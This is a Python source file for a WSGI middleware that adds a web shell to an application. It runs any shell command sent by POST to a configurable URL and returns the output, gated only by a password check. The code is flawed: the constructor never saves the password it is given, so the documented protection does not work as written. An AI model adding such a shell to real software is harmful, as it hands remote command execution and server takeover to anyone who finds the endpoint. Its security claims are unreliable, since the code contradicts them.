'''
Created on 2015-5-1

@author: cheneave
'''
import json
from subprocess import PIPE, Popen
import sys


class ShellMiddleware(object):

    '''
    classdocs
    '''

    def __init__(self, app, password, url_path="webshell"):
        '''
        Constructor

        app indicates the application that should be called if the request is for shell
        password should be given, for safety reason, there are no default password
        url_path indicates the url path of the webshell, "/" not included
        '''
        self.app = app
        self.url_path = '/' + url_path

    @staticmethod
    def run_cmd(cmd):
        try:
            pipe = Popen(cmd, stdout=PIPE, stderr=PIPE, shell=True)
            out, err = pipe.communicate()
            try:
                out = out.decode(sys.stdout.encoding) if out else ""
            except:
                pass
            try:
                err = err.decode(sys.stderr.encoding) if err else ""
            except:
                pass
            return "{}{}".format(out, err)
        except Exception as e:
            return str(e)

    def __call__(self, environ, start_response):
        if environ["PATH_INFO"] == self.url_path:
            start_response(
                "200 OK", [("Content-type", 'text/plain;charset=utf-8')])
            if environ["REQUEST_METHOD"].upper() != "POST":
                return ["only support post"]

            try:
                wsgi_input = environ["wsgi.input"]
            except KeyError:
                return ["no input data"]

            try:
                content_length = int(environ.get("CONTENT_LENGTH", 0))
            except ValueError:
                content_length = 0

            dat = wsgi_input.read(content_length)
            try:
                req = json.loads(dat)
            except ValueError:
                return ["parsing request failed"]

            if req.get("password", "") != self.password:
                return ["wrong password"]

            return self.run_cmd(req.get("command", ""))
        else:
            return self.app(environ, start_response)
